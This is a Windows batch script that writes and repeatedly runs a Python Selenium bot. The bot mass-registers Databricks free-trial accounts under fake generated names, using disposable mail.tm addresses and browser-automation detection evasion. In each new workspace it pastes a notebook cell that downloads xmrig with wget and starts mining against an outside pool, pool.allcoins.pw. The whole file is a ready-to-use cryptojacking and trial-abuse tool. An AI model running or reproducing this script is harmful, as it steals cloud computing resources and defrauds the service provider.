pip install selenium names		
echo	from selenium import webdriver 	> autobricks.py
echo	from selenium.webdriver import ActionChains 	>> autobricks.py
echo	from selenium.webdriver.common.keys import Keys 	>> autobricks.py
echo	from selenium.webdriver.support.ui import WebDriverWait 	>> autobricks.py
echo	from selenium.webdriver.common.by import By 	>> autobricks.py
echo	from selenium.webdriver.support import expected_conditions as EC 	>> autobricks.py
echo	import names, time 	>> autobricks.py
echo	option = webdriver.ChromeOptions() 	>> autobricks.py
echo	option.add_experimental_option("excludeSwitches", ["enable-automation"]) 	>> autobricks.py
echo	option.add_experimental_option('useAutomationExtension', False) 	>> autobricks.py
echo	option.add_argument('--disable-blink-features=AutomationControlled') 	>> autobricks.py
echo	option.add_argument('--disable-gpu') 	>> autobricks.py
echo	#option.add_argument('--headless') 	>> autobricks.py
echo	option.add_argument('--disable-software-rasterizer') 	>> autobricks.py
echo	driver = webdriver.Chrome(executable_path='chromedriver',options=option) 	>> autobricks.py
echo	def get_email():	>> autobricks.py
echo	    print("get email")	>> autobricks.py
echo	    global email	>> autobricks.py
echo	    driver.get("https://mail.tm/en/")	>> autobricks.py
echo	    time.sleep(3)	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#accounts-menu > span > span').click();")	>> autobricks.py
echo	    #account = driver.find_element_by_xpath('//*[@id="accounts-menu"]').click()	>> autobricks.py
echo	    time.sleep(3)	>> autobricks.py
echo	    email = driver.find_element_by_xpath('//*[@id="accounts-list"]/div/div[1]/p[2]').text	>> autobricks.py
echo	    print(email)	>> autobricks.py
echo	def try_databricks():	>> autobricks.py
echo	    print("Open databricks")	>> autobricks.py
echo	    driver.execute_script("window.open('about:blank','secondtab');") 	>> autobricks.py
echo	    driver.switch_to.window("secondtab") 	>> autobricks.py
echo	    driver.get('https://databricks.com/try-databricks')	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#FirstName').value='"+names.get_first_name()+"';")	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#LastName').value='"+names.get_last_name()+"';")	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#Company').value='"+names.get_last_name()+"';")	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#Email').value='"+email+"';")	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#Title').value='staff';")	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#mkto_form_consent').click();")	>> autobricks.py
echo	    time.sleep(5)	>> autobricks.py
echo	    try:	>> autobricks.py
echo	        driver.execute_script("document.querySelector('#om-qntjsvpnnpkxkiyqlnfx-optin > div > button').click();")	>> autobricks.py
echo	    except:	>> autobricks.py
echo	        print("no ads")	>> autobricks.py
echo	    time.sleep(3)	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#submitToMktoForm_2021Feb10 > div.mktoButtonRow > span > button').click();")	>> autobricks.py
echo	    time.sleep(5)	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#ce-placeholder-button').click();")	>> autobricks.py
echo	    WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"Time to check your email!")]')))    	>> autobricks.py
echo	def read_email():	>> autobricks.py
echo	    print("read email")	>> autobricks.py
echo	    driver.get("https://mail.tm/en/")	>> autobricks.py
echo	    WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul')))	>> autobricks.py
echo	    driver.find_element_by_xpath('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul').click()	>> autobricks.py
echo	    WebDriverWait(driver,120).until(EC.frame_to_be_available_and_switch_to_it((By.ID,"iFrameResizer0")))	>> autobricks.py
echo	    driver.execute_script("document.querySelector('body > p:nth-child(3) > a').click();")	>> autobricks.py
echo	def reset_password():	>> autobricks.py
echo	    print("reset password") 	>> autobricks.py
echo	    driver.switch_to.default_content()	>> autobricks.py
echo	    handles = driver.window_handles	>> autobricks.py
echo	    size = len(handles) 	>> autobricks.py
echo	    for x in range(size): 	>> autobricks.py
echo	        if handles[x] != driver.current_window_handle: 	>> autobricks.py
echo	            driver.switch_to.window(handles[x])	>> autobricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="reset-container"]/div/div[1]/input'))) 	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(3) > input').value='1234Asdfg@';")	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(5) > input').value='1234Asdfg@';")	>> autobricks.py
echo	    #click reset	>> autobricks.py
echo	    time.sleep(3)	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(6) > button').click();")	>> autobricks.py
echo	def create_workspace():	>> autobricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]')))	>> autobricks.py
echo	    #new python	>> autobricks.py
echo	    driver.execute_script("document.querySelector('#content > div > div > uses-legacy-bootstrap > div > div > div.homeview-inner > div.homeview-panel > div.ant-row.ant-row-center.homeview-row.homeview-top > div:nth-child(3) > div > div > div > a > div.header').click();")	>> autobricks.py
echo	    #input name	>> autobricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="input"]'))) 	>> autobricks.py
echo	    #driver.execute_script("document.querySelector('#input').value='Plant';")	>> autobricks.py
echo	    driver.find_element_by_xpath('//*[@id="input"]').send_keys("Plant")	>> autobricks.py
echo	    #create	>> autobricks.py
echo	    driver.execute_script("document.querySelector('body > div.ReactModalPortal > div > div > uses-legacy-bootstrap > uses-legacy-bootstrap > button.btn.btn-primary > span').click();")	>> autobricks.py
echo	    #click cell	>> autobricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[2]/div[2]/div/div[3]/div[1]/div/div/div/div[4]/div[1]/div/div/div/div[5]/div/pre'))) 	>> autobricks.py
echo	    driver.find_element_by_css_selector(".CodeMirror-line").click()	>> autobricks.py
echo	    driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.allcoins.pw:3333 -a rx -k -u allcoins.pw -p 511240")	>> autobricks.py
echo	    #start cell	>> autobricks.py
echo	    driver.find_element_by_css_selector(".fa-play").click()	>> autobricks.py
echo	    driver.find_element_by_css_selector(".run-cell > .fa").click() 	>> autobricks.py
echo	    driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()	>> autobricks.py
echo	    print("**********************DONE***************************")	>> autobricks.py
echo	get_email()	>> autobricks.py
echo	try_databricks()	>> autobricks.py
echo	read_email()	>> autobricks.py
echo	reset_password()	>> autobricks.py
echo	create_workspace()	>> autobricks.py
:loop		
python autobricks.py		
taskkill /F /FI "CPUTIME gt 00:30:00" /FI "IMAGENAME eq chrome.exe"		
goto :loop
